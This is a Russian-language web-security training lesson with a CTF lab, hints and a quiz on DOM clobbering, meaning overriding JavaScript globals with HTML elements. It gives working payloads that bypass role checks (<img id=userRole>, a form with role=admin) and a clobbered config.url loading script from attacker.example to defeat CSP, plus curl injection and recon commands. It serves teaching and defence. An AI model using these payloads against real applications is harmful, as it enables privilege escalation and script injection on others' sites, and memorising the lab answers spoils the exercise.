---
id: web-dom-clobbering
title: "DOM clobbering: подмена глобальных переменных через HTML"
category: web
parent: web-same-origin-cors
difficulty: hard
order: 4
tags: [dom-clobbering, xss, html, sanitizer, csp, client-side]
prerequisites: [web-xss, web-same-origin-cors]
useful_for:
  - "CTF Web категория"
  - "Bug bounty"
estimated_minutes: 45
summary: "Как без JavaScript переопределить window-переменные через HTML-элементы и обойти проверки, санитайзеры и CSP."
lab:
  kind: shell
  title: "Практика: DOM clobbering ломает проверку роли"
  toolset: [core, curl]
  workdir: /home/student/task
  files: [task.md]
  check: "grep -q 'nto{' found.txt"
  hints:
    - "Проверь HTML-инъекцию в bio: curl -s 'https://target.local/profile?bio=<a id=foo>x</a>' -b 'session=me'"
    - "Тег вернулся как есть — HTML-инъекция возможна."
    - "Код проверяет window.userRole. Вставь <img id=userRole> — элемент станет truthy."
    - "Отправь инъекцию и сохрани ответ: curl -s 'https://target.local/profile?bio=<img id=userRole>' -b 'session=me' > found.txt"

---

## Вопрос, с которого всё начинается

Фильтр на сайте режет `<script>`, а CSP запрещает инлайн-скрипты. Кажется, XSS невозможна. Но HTML-то он пропускает.

И тут выясняется интересное: обычные HTML-теги могут **затирать глобальные переменные** JavaScript. Если приложение доверяет своей переменной `window.userRole`, а ты подсунул тег с `id="userRole"` — приложение прочитает твой тег вместо своего значения. Это **DOM clobbering**: подмена данных без единой строки JavaScript. Сегодня покажем, как она ломает проверку роли.

## Наш пример: HTML-инъекция в профиле

У нас есть профиль на `target.local/profile`, где поле «о себе» отражается без экранирования HTML. Сначала убедимся, что теги проходят:

```bash
$ curl -s 'https://target.local/profile?bio=<a id=foo>x</a>' -b 'session=me' | grep -o '<a id=foo>x</a>'
<a id=foo>x</a>
```

Тег вернулся как есть — значит, HTML-инъекция возможна. Теперь посмотрим, как это можно использовать.

## Шаг 1: named access — почему `window` видит теги

В браузере работает механизм **named access**: элемент с атрибутом `id` (или `<form>`/`<img>`/`<embed>`/`<object>` с `name`) становится доступен как свойство `window` и `document` по своему имени:

```html
<img id="config">
<script>
  console.log(config);         // <img id="config"> — элемент, а не переменная!
  console.log(window.config);  // то же самое
</script>
```

Если в приложении есть переменная `config`, объявленная **не** через `let`/`const` (например, это `window.config` или необъявленное чтение), то тег `id="config"` её перекроет. Порядок важен: если скрипт присваивает `window.config = {...}` **после** парсинга твоего тега — выигрывает скрипт. Если скрипт читает `config` до присваивания — выигрывает элемент.

## Шаг 2: ломаем проверку роли

Представим код приложения:

```html
<script>
  if (window.userRole) { showAdminPanel(); }
</script>
```

Проверка истинности `window.userRole`. Санитайзер убирает `<script>`, но `id` разрешает. Вставляем в профиль:

```html
<img id="userRole">
```

Теперь `window.userRole` — это элемент `<img>` (объект, то есть truthy). Проверка проходит, и админ-панель открывается **без исполнения JavaScript**. В отчёте фиксируем: HTML-инъекция + доверие к глобальной переменной = повышение привилегий.

## Шаг 3: получаем HTMLCollection

Часто проверка работает не с объектом, а с коллекцией: код делает `x.length`, `x[0]` или `String(x)`. Чтобы получить объект, похожий на массив, дублируют `name` внутри `<form>`:

```html
<form id="x">
  <input name="y">
  <input name="y">
</form>
<!-- x.y -> RadioNodeList/HTMLCollection длины 2 -->
```

| Цель в коде | HTML-пейлоад | Результат |
|-------------|--------------|-----------|
| `window.foo` | `<a id=foo>` | HTMLElement |
| `foo.bar` | `<form id=foo><input name=bar>` | элемент |
| `foo.length` | дубли `name` внутри `form` | HTMLCollection с `.length` |
| `document.getElementById` | — | встроенный метод, не перебить |

Важно: встроенные свойства вроде `document.body`, `document.forms`, `location` и `document.cookie` так перебить **нельзя** — они защищены.

## Шаг 4: clobbering + script gadget → обход CSP

Сам по себе clobbering не исполняет код — это примитив **подмены данных**. Его нужно «дотащить» до опасного sink'а. Если на странице есть доверенный скрипт (**gadget**), который читает переменную и создаёт скрипт, — clobbering замыкает цепочку:

```js
// gadget в доверенном app.js
var s = document.createElement('script');
s.src = config.url;
document.body.appendChild(s);
```

Клобберим `config.url`:

```html
<form id="config"><input name="url" value="https://attacker.example/x.js"></form>
```

`window.config` становится формой, `config.url` — значение input, и скрипт грузится с нашего домена. При `strict-dynamic` это разрешено, потому что инициатор (доверенный скрипт) уже доверенный. Так HTML-инъекция превращается в XSS в обход CSP.

## Шаг 5: clobbering + prototype pollution

Два примитива дополняют друг друга. Clobbering даёт подконтрольный **объект** там, где ожидается конфиг; prototype pollution — подконтрольные **свойства** там, где ожидается чистая структура. Вместе они ломают «защищённые» проверки: pollution заставляет `if (obj.isAdmin)` вернуть истину, а clobbering подставляет сам объект.

## Если не сработало

- Переменная объявлена через `let`/`const` — это лексическая привязка, `window`-элемент её не перебивает.
- Скрипт присваивает переменную после твоего тега — clobbering проигрывает, ищи другой порядок.
- Санитайзер (DOMPurify) чистит `id`/`name` — тестируй реальную конфигурацию: в некоторых режимах они разрешены.
- Прямого sink'а нет — комбинируй с prototype pollution (подставить свойства) или ищи gadget, читающий URL из DOM.

## Полный пример: роль через форму

Более реалистичный случай: код читает `window.currentUser.role` и, если это `admin`, показывает панель:

```js
if (window.currentUser && window.currentUser.role === 'admin') { showAdminPanel(); }
```

Подставляем форму с нужным полем:

```html
<form id="currentUser"><input name="role" value="admin"></form>
```

Браузер создаёт `window.currentUser`, ссылающийся на форму, а `window.currentUser.role` читает значение input — `admin`. Проверка обходится без XSS. Проверим по шагам:

```bash
$ curl -s 'https://target.local/profile?bio=<form id=currentUser><input name=role value=admin></form>' \
>   -b 'session=me' | grep -o 'id=currentUser'
id=currentUser
# в консоли браузера: window.currentUser.role -> "admin"
```

Если UI показал админ-панель — clobbering сработал. В отчёте фиксируй точную переменную, которую удалось подменить.

## Как искать clobbering-цели

Начинай с поиска sink'ов — мест, где код читает глобальные значения и передаёт их в опасные API. Грепай бандлы по `window.`/`document.`/`document.all` и по созданию скриптов:

```bash
$ katana -u https://target.local -jc -silent | grep -E '\.js' | while read u; do
>   curl -s "$u" | grep -oE '(window|document)\.[a-zA-Z_]+'; done | sort -u
window.config
window.userRole
```

Дальше проверяй конкретные чтения, ведущие в sink:

```bash
$ curl -s https://target.local/app.js -o app.js
$ grep -nE 'createElement\(.script|document\.write|innerHTML|\.src *=' app.js
```

В DevTools Console удобно проверять гипотезу вручную: создай элемент и посмотри, что вернёт имя:

```js
document.body.innerHTML += '<a id="foo">x</a>';
console.log(typeof window.foo, window.foo);   // "object", <a id="foo">
```

Инструмент **DOM Invader** (в Burp) автоматизирует это: он подставляет clobbering-пейлоады в параметры и показывает, где значение влияет на DOM-sink.

## Что мы теперь знаем

- Named access: элемент с `id`/`name` становится свойством `window`/`document`.
- DOM clobbering подменяет значение переменной, но **сам код не исполняет**.
- Проверка `if (window.x)` обходится тегом `<img id=x>` без JS.
- Дубли `name` внутри `form` дают HTMLCollection с `.length`.
- Clobbering + script gadget → обход `strict-dynamic`; с prototype pollution — обход проверок.
- Встроенные свойства (`document.body`, `location`, `cookie`) перебить нельзя.

## На что смотреть дальше

- Не путай clobbering с XSS: это подмена данных, без sink'а — «просто HTML».
- Проверяй **порядок**: если скрипт присваивает переменную после тега, clobbering не сработает.
- Ищи чтение из `window.`/`document.`/`document.all` в бандлах — это кандидаты в sink.
- Помни про `let`/`const`: они создают привязку, которую `window` не перебивает.
- Тестируй санитайзер: DOMPurify в некоторых конфигурациях чистит `id`/`name`.
- Комбинируй с prototype pollution и CSP-bypass — clobbering редко работает в одиночку.

## Квиз

Проверь себя.

```quiz
- question: "Что делает механизм named access?"
  options:
    - "Элемент с `id`/`name` становится свойством `window`"
    - "Шифрует HTML"
    - "Отключает JavaScript"
    - "Удаляет cookies"
  answer: 0
  explanation: "Браузер открывает элементы по имени через `window[name]`/`document[name]`."
- question: "DOM clobbering сам по себе..."
  options:
    - "Исполняет произвольный JavaScript"
    - "Подменяет значение переменной, но не исполняет код"
    - "Обходит TLS"
    - "Меняет DNS"
  answer: 1
  explanation: "Это примитив подмены данных; для XSS нужен sink, читающий переменную."
- question: "Как получить `HTMLCollection` при clobbering?"
  options:
    - "Один `<img id=x>`"
    - "Два элемента с одинаковым `name` внутри `form`"
    - "`<style>`-тег"
    - "Cookie с тем же именем"
  answer: 1
  explanation: "Дубли `name` создают коллекцию (`form.x` → HTMLCollection/RadioNodeList)."
- question: "В каком случае clobbering НЕ сработает?"
  options:
    - "Если переменная объявлена через `let`/`const`"
    - "Если страница по HTTPS"
    - "Если стоит `HttpOnly`"
    - "Если включён HTTP/2"
  answer: 0
  explanation: "`let`/`const` создают лексическую привязку, которую `window`-элемент не перебивает."
- question: "Зачем clobbering используют в связке с CSP-bypass?"
  options:
    - "Чтобы ускорить загрузку"
    - "Чтобы подменить данные, которые читает существующий (script gadget) код"
    - "Чтобы отключить CSP-заголовок"
    - "Чтобы поставить cookie"
  answer: 1
  explanation: "HTML-инъекция + script gadget = исполнение в обход запрета inline-скриптов."
```

## Куда дальше

В следующем уроке мы разберём **CSP advanced** (`web-csp-advanced`): переиспользование nonce, обход `strict-dynamic` через script gadgets и захват скриптов через `<base>`. А пока главное запомни: «санитизировать теги» недостаточно — если код доверяет глобальной переменной, HTML-элемент может её подменить.

## Где пригодится

- **CTF (Web):** задачи, где фильтр режет `<script>`, но оставляет HTML; clobbering — путь к «XSS без XSS».
- **Bug bounty:** HTML-инъекция, которую считают безобидной, часто эскалируется через clobbering.
- **Пентест:** анализ SPA и санитайзеров; поиск глобальных переменных, читаемых из DOM.
- **Работа (AppSec/Dev):** понимание, почему «санитизировать теги» недостаточно — нужно запрещать `id`/`name` и не полагаться на глобальные переменные.
